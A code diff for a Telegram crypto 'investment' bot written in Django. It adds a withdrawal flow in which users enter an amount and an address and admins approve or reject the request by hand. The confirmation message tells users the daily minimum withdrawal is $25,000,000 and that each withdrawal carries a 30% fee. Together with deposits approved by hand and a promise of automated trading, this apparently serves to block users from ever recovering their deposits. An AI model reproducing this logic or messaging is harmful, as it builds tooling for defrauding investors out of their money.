@@ -113,8 +113,6 @@ def set_my_client_name(message):
 	bot.send_message(chat_id=user_detail["chat_id"], text="Select the currency you want to invest:",reply_markup=payment_method())
 
 
-
-
 def set_invest_amount(message):
 	user_detail =  user_details(message)
 	MY_STATE = return_state(user_detail["user_id"])
@@ -163,7 +161,7 @@ def process_transaction_hash(message):
 	MY_STATE = return_state(user_detail["user_id"])
 	MyUser = User.objects.get(user_id=user_detail["user_id"])
 
-	print(MY_STATE,"UGHBJUYTGHBJKUYGHBNJUHGB")
+	# print(MY_STATE,"UGHBJUYTGHBJKUYGHBNJUHGB")
 
 
 	if message.text == "❌ Cancel":
@@ -183,7 +181,7 @@ def process_transaction_hash(message):
 				my_exchange = f"{MY_STATE['exchange']}"
 
 			# if result == True:
-			myclient = MyClient(myclient=MyUser,balance=MY_STATE["deposit_amount"],exchange=my_exchange,client_name=MY_STATE["client_name"],has_funds=False,start_trading=False)
+			myclient = MyClient(myclient=MyUser,balance=MY_STATE["deposit_amount"],exchange=my_exchange,client_name=MY_STATE["client_name"],investment_currency=payment_method,has_funds=False,start_trading=False)
 			myclient.save()
 
 			bot.send_message(user_detail["chat_id"],msg,reply_markup=ReplyKeyboardRemove(selective=False))#Main_Menu())
@@ -206,6 +204,74 @@ def process_transaction_hash(message):
 		except Exception as e:
 			print(e)
 
+
+def process_withdrawal_amount(message):
+	user_detail =  user_details(message)
+	MY_STATE = return_state(user_detail["user_id"])
+	MyUser = User.objects.get(user_id=user_detail["user_id"])
+
+	if message.text == "❌ Cancel":
+		STEP.objects.filter(user = user_detail["user_id"]).update(next_step="")
+		bot.send_message(user_detail["chat_id"],"Action terminated use the /start command to begin",reply_markup=ReplyKeyboardRemove(selective=False))
+	else:
+
+		try:
+			withdrawal_amount = float(message.text)
+			my_clients = MyClient.objects.filter(myclient=MyUser).filter(balance__gte=withdrawal_amount)
+
+
+			if my_clients.exists():
+				msg = "Please enter the address to withdraw to:"
+				MY_STATE["WITHDRAWAL"]["withdrawal_amount"] = withdrawal_amount
+
+				bot.send_message(chat_id=user_detail["chat_id"],text=msg,reply_markup=Cancel_btn())
+				STEP.objects.filter(user = MyUser).update(state = MY_STATE,next_step="GET_WITHDRAWAL_ADDRESS")
+
+			else:
+				msg = "Sorry but you don't have upto that amount yet"
+				bot.send_message(chat_id=user_detail["chat_id"],text=msg,reply_markup=Main_Menu())
+
+		except Exception as e:
+
+			print(e,"sdfgdewqerfdgfdsfghfds")
+			msg = "Please enter the amount you want to withdraw in USDT:(Don't include any alphabets just the digit)"
+			bot.send_message(chat_id=user_detail["chat_id"], text=msg,reply_markup=Cancel_btn())
+
+
+def process_withdrawal_address(message):
+	user_detail =  user_details(message)
+	MY_STATE = return_state(user_detail["user_id"])
+	MyUser = User.objects.get(user_id=user_detail["user_id"])
+
+	if message.text == "❌ Cancel":
+		STEP.objects.filter(user = user_detail["user_id"]).update(next_step="")
+		bot.send_message(user_detail["chat_id"],"Action terminated use the /start command to begin",reply_markup=ReplyKeyboardRemove(selective=False))
+	else:
+		withdrawal_address = message.text
+		withdrawal_amount = MY_STATE["WITHDRAWAL"]["withdrawal_amount"]
+		withdrawal_currency = MY_STATE["WITHDRAWAL"]["withdrawal_currency"]
+
+
+		MY_STATE["WITHDRAWAL"]["withdrawal_address"] = withdrawal_address
+		STEP.objects.filter(user = MyUser).update(state = MY_STATE,next_step="")
+
+
+
+		msg = f"""
+
+		You are sending ${withdrawal_amount} of {withdrawal_currency}
+		To: {withdrawal_address}
+
+
+		<i>⚠️please note: daily minimum withdrawal is $25,000,000⚠️
+
+		⚠️also note: there is a 30% fee for every withdrawal⚠️</i>
+		"""
+		bot.send_message(chat_id=user_detail["chat_id"],text=msg,reply_markup=confirm_withdrawal())
+		STEP.objects.filter(user = user_detail["user_id"]).update(next_step="")
+
+
+
 def notify_admin(user):
 	""" This is used to broadcast a new member subscription """
 	admins = User.objects.filter(is_admin=True)
@@ -224,8 +290,6 @@ def notify_admin(user):
 		bot.send_message(admin.chat_id,msg)
 
 
-
-
 def notify_admin_payment(client_id,coin,txn_hash):
 	""" This is used to broadcast a new member subscription """
 	admins = User.objects.filter(is_admin=True)
@@ -234,9 +298,26 @@ def notify_admin_payment(client_id,coin,txn_hash):
 	for admin in admins:
 		msg = f"@{client.myclient.user_name} invested  {client.balance} {coin} \n\n TXN HASH: <code>{txn_hash}</code>"
 		try:
-			bot.send_message(admin.chat_id,msg,reply_markup=admin_approval(client.myclient))
+			client_id = hex(int(client.client_id.time_low))[2:]
+			bot.send_message(admin.chat_id,msg,reply_markup=admin_approval(client.myclient,client_id))
 		except Exception as e:
 			print(e,"uytdghjio98uydghjkioi7duyhgbn")
+
+
+def notify_admin_withdrawal(client_id,withdrawal_amount,withdrawal_currency,withdrawal_address):
+	""" This is used to broadcast a new member subscription """
+	admins = User.objects.filter(is_admin=True)
+	client = MyClient.objects.get(client_id=client_id)
+
+	for admin in admins:
+		msg = f"""@{client.myclient.user_name} initiated a withdrawal request for  ${withdrawal_amount} 
+		worth of <b>{withdrawal_currency}</b> To the address: <code>{withdrawal_address}</code>"""
+
+		try:
+			client_id = hex(int(client.client_id.time_low))[2:]
+			bot.send_message(admin.chat_id,msg,reply_markup=admin_approve_withdrawal(client_id,withdrawal_amount))
+		except Exception as e:
+			print(e,"iuytrgfgvbbhjkio87u6ytredfxcvbnhjmkio8u7y6tredf")
 # CALLBACK QUERY HANDLING OCCURS HERE
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -392,11 +473,16 @@ def callback_query(call):
 
 
 		elif call.data.startswith("add_user:"):
-			q = call.data.split(":")[1]
-			subscriber = User.objects.get(user_id=q)
+			user,client_id = call.data.split(":")[1].split(",")
+			subscriber = User.objects.get(user_id=user)
 
 			MyClient.objects.filter(myclient=subscriber).update(has_funds = True,start_trading=True)
 			bot.send_message(subscriber.chat_id,"Congratulations You deposit is successful the bot will start trading now.")
+
+			my_client = MyClient.objects.filter(Q(client_id__icontains=client_id)).first()# This is for a users client method
+
+			msg = f"{call.message.text}\n\n Payment Approved ✅✅✅"
+			bot.edit_message_text(chat_id=chat_id, text=msg, message_id=call.message.message_id,reply_markup=admin_approval(my_client.myclient,client_id))
 
 		elif call.data.startswith("reject_user:"):
 			q = call.data.split(":")[1]
@@ -405,6 +491,8 @@ def callback_query(call):
 			"""
 			MyClient.objects.filter(myclient=subscriber).update(has_funds = False,start_trading = False)
 			bot.send_message(subscriber.chat_id,msg)
+
+			bot.delete_message(chat_id=chat_id,message_id=call.message.message_id)
 
 		#ABOUT CORNIX CALLBACK DATA
 		elif call.data == "about_cornix":
@@ -425,8 +513,82 @@ def callback_query(call):
 		elif call.data == "cornix_features":
 			bot.edit_message_text(chat_id=chat_id, text=cornix_features, message_id=call.message.message_id,reply_markup=about_cornix_back())
 
+		
+
+		#WITHDRAWAL FUNTION BEGINS
+
+		elif call.data == "widthdrawal":
+
+			MY_STATE["WITHDRAWAL"] = {}
+			STEP.objects.filter(user = user).update(state = MY_STATE)
+			msg = "Select the appropriate crypto asset to proceed with your withdrawal.\n\n Select the coins to withdraw :"
+			bot.edit_message_text(chat_id=chat_id, text=msg, message_id=call.message.message_id,reply_markup=withdrawal_currency_opt())
+
+
+		elif call.data.startswith("withdraw_with:"):
+			q = call.data.split(":")[1]
+			MY_STATE["WITHDRAWAL"]["withdrawal_currency"] = q
+			msg = "Please enter the amount you want to withdraw in USDT:"
+			bot.send_message(chat_id=chat_id, text=msg,reply_markup=Cancel_btn())
+
+			STEP.objects.filter(user = user).update(state = MY_STATE,next_step="GET_WITHDRAWAL_AMOUNT")
+
+
+		elif call.data == "confirm_withdrawal":
+
+			withdrawal_amount = MY_STATE["WITHDRAWAL"]["withdrawal_amount"]
+			my_clients = MyClient.objects.filter(myclient=user).filter(balance__gte=withdrawal_amount)
+			if my_clients.exists():
+
+				client = my_clients.first()
+
+				withdrawal_amount = MY_STATE["WITHDRAWAL"]["withdrawal_amount"]
+				withdrawal_address = MY_STATE["WITHDRAWAL"]["withdrawal_address"]
+				withdrawal_currency = MY_STATE["WITHDRAWAL"]["withdrawal_currency"]
+
+
+				bot.send_message(chat_id=chat_id, text="Withdrawal in progress please wait...")
+				notify_admin_withdrawal(client.client_id,withdrawal_amount,withdrawal_currency,withdrawal_address)
+			else:
+				bot.send_message(chat_id=chat_id, text="Sorry not enough balance",reply_markup=Main_Menu())
+
+
+		elif call.data == "cancel_withdrawal":
+			bot.send_message(chat_id=chat_id, text="Withdrawal has been canceled",reply_markup=Main_Menu())
+
+
+		elif call.data.startswith("approve_withdrawal:"):
+			client_id,withdrawal_amount = call.data.split(":")[1].split(",")
+			my_client = MyClient.objects.filter(Q(client_id__icontains=client_id)).first()# This is for a users client method
+
+			balance = float(my_client.balance)-float(withdrawal_amount)
+			my_client.balance = balance 
+			my_client.save()
+
+			if int(my_client.balance) <= 0:
+				my_client.delete()# delete the users client
+			else:
+				pass
+
+
+			client_id = hex(int(my_client.client_id.time_low))[2:]
+			msg = f"{call.message.text}\n\nWidthdrawal Approved ✅✅✅"
+			bot.edit_message_text(chat_id=chat_id, text=msg, message_id=call.message.message_id,reply_markup=admin_approve_withdrawal(client_id,withdrawal_amount))
+
+
+		elif call.data.startswith("reject_withdrawal:"):
+			# client_id = call.data.split(":")[1]
+			# my_client = MyClient.objects.filter(Q(client_id__icontains=client_id)).first()# This is for a users client method
+			bot.delete_message(chat_id=chat_id,message_id=call.message.message_id)
+			
+
+
+			
+			
+
 		else:
 			pass
+
 	except Exception as e:
 		print(type(e).__name__,e,"CALLBACK ERROR")
 		# bot.send_message(chat_id,step_1_of_3,reply_markup=new_client_step_1_of_3())
@@ -482,8 +644,16 @@ def reply_msg(message):
 		elif my_state.next_step == "PROC_TXN_HASH":
 			process_transaction_hash(message)
 		elif my_state.next_step == "GET_INVEST_AMOUNT":
-			print("HGBNMJHGFVB NHGV")
 			set_invest_amount(message)
+		elif my_state.next_step == "GET_WITHDRAWAL_AMOUNT":
+			process_withdrawal_amount(message)
+
+		elif my_state.next_step == "GET_WITHDRAWAL_ADDRESS":
+			process_withdrawal_address(message)
+
+		elif message.text == "❌ Cancel":
+			STEP.objects.filter(user = user_detail["user_id"]).update(next_step="")
+			bot.send_message(user_detail["chat_id"],"Action terminated use the /start command to begin",reply_markup=ReplyKeyboardRemove(selective=False))
 
 		else:
 			bot.send_message(user_detail["chat_id"],message.text)
@@ -509,10 +679,11 @@ def WebConnect(request):
 	else:
 		bot.remove_webhook()
 		bot.set_webhook(url=settings.WEBHOOK_URL+settings.WEBHOOK_TOKEN)
+		print("Done")
 		return HttpResponse(status=201)
 
 
-bot.load_next_step_handlers(filename="handlers-saves/step.save")
+# bot.load_next_step_handlers(filename="handlers-saves/step.save")
 # try:
 # 	bot.remove_webhook()
 # 	bot.infinity_polling(timeout=10, long_polling_timeout = 5)
